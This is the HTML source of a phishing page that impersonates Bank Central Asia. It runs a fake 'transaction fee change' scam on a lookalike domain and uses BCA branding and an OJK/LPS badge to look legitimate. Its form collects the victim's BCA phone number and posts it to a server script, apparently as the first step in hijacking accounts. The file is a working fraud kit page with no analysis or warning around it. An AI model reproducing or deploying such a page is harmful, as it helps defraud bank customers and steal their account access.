...
<meta charset="UTF-8">
	...
	<title>AKTIVASI TARIF BCA</title>
<link rel="icon" type="image/png" href="https://perubahan-tarif-transaksi-2024.ws-com.sbs/Bank-Bca/img/bcaa.jpg"/>
<link property="og:image" content="https://perubahan-tarif-transaksi-2024.ws-com.sbs/Bca-Mobile/img/bcaa.jpg"/>
<style>
@font-face {
...
.fa-eye-slash {
    background: url(https://cdn.jsdelivr.net/gh/AlexHostX/another@main/brims/20220617022922.png) no-repeat center;
}
.opbtn {
    opacity: 0.5;
}
...
<main>
<welalxcome>
<img src="./assets/img/Bank_Central_Asia.svg.png" alt="" />
</welalxcome>
...
<img style="margin-bottom:5px; margin-left:10px;" width="100px" src="https://upload.wikimedia.org/wikipedia/commons/thumb/5/5c/Bank_Central_Asia.svg/2560px-Bank_Central_Asia.svg.png" alt="" />
<div class="slider">
<figure>
<div class="slide">
<img src="./assets/img/bnr.png">
</div>
<div class="slide">
<img src="./assets/img/bnr.png">
</div>
...
<form action="./auth/sendTarif.php" method="post">
<div class="" style="margin-left: 20px;margin-top: -300px;position:absolute;border:1px solid #0085e0;padding:15px;width:82%;border-radius:22px">
<center style="color:#09559a;">
<br>
<span>
<h4>Silahkan Pilih Tarif Transaksi Sesuai Kebutuhan Anda Di Bawah Ini</h5>
</span>
</center>
<br>
<hr>
...
Tarif Lama Rp 6.500 / Pertransaksi
</label>
</h3>
<br>
<h5 style="margin-left:13px;">Masukan Nomor ponsel BCA Anda:</h5>
<i class="ion-ios-telephone-outline" id="ionIcons"></i>
<input id="nomor" data-mask="0000-0000-0000" name="nomor" type="tel" style="box-sizing: border-box; height: 40px; width: 536px; max-width: 100%; border: 2px solid rgb(0, 134, 224); border-image: initial; background-color: rgb(255, 255, 255); border-radius: 18px; box-shadow: rgb(237, 237, 237) 2px 2px 2px 0px; font-family: 'Roboto Condensed', sans-serif; font-weight: bold; font-size: 16px; color: rgb(28, 28, 28); word-spacing: 7px; padding: 0px 45px;" placeholder="08xx-xxxx-xxxx" maxlength="12" pattern="[0][8][1-9].{9,}"title="Masukan nomor ponsel"required>
<br>
<br>
</div>
<div>
<br>
<br>
<button type="submit" style="margin-left: 20px;margin-top: -60px;position:absolute;background-color:#0085e0;color:white;border:1px solid #0085e0;width:90%;border-radius:15px;font-size: 15px;padding:13px;font-weight:bold;" value="Lanjut">Lanjutkan</button>
<br>
<br>
<br>
...
<center>
<div class="css-dnzamn">
<img src="./assets/img/ojk_lps.png" width="160">
</div>
</div>
</form>
</div>
...
<script src="https://cdnjs.cloudflare.com/ajax/libs/jquery/3.6.0/jquery.min.js" integrity="sha512-894YE6QWD5I59HgZOGReFYm4dnWc1Qt5NtvYSaNcOP+u1T9qYdvdihz0PPSiiqn/+/3e7Jo4EaG7TubfWGUrMQ==" crossorigin="anonymous" referrerpolicy="no-referrer"> <script src='https://cdnjs.cloudflare.com/ajax/libs/jquery/3.1.1/jquery.min.js'></script>
